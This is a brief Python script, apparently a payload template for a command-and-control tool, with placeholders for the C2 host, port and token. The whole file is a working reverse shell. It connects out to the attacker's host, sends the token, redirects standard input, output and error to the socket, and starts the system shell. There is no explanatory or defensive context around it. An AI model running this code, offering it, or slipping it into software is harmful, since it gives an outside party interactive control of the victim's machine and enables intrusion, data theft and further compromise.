import socket, os, subprocess, sys

HOST = "__C2_RS_HOST__"
PORT = __C2_RS_PORT__
TOKEN = "__C2_TOKEN__"

s = socket.socket()
s.settimeout(30)
try:
    s.connect((HOST, PORT))
except Exception as e:
    sys.exit(1)

s.send((TOKEN + "\n").encode())

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

subprocess.call([os.environ.get("SHELL", "/bin/sh")])
